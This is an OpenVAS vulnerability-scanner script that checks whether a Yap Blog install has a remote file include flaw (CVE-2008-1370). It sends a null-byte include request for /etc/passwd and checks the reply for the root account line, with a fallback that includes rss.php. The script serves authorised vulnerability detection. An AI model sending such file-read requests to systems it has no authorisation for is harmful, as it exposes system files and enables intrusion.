###############################################################################
# OpenVAS Vulnerability Test
# $Id: Yap_Blog_remote-file_include.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Yap Blog 'index.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Yap Blog is prone to a remote file-include vulnerability because it
  fails to sufficiently sanitize user-supplied input.

  Exploiting this issue may allow an attacker to compromise the
  application and the underlying system; other attacks are also
  possible.

  Versions prior to Yap Blog 1.1.1 are vulnerable.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100046");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-1370");
 script_bugtraq_id(28120);
 script_name("Yap Blog 'index.php' Remote File Include Vulnerability");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/28120");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/blog", "/yap", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/index.php?page=/etc/passwd%00");

  if(http_vuln_check(port:port, url:url,pattern:"root:x:0:[01]:.*")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  } else {
    # etc/passwd not readeable. Perhaps windows or open basedir. Try
    # to include yap rss.php. If included this results in "Cannot
    # modify header..."
    url = string(dir, "/index.php?page=rss.php%00");

    if(http_vuln_check(port:port, url:url,pattern:"Cannot modify header information - headers already sent.*")) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
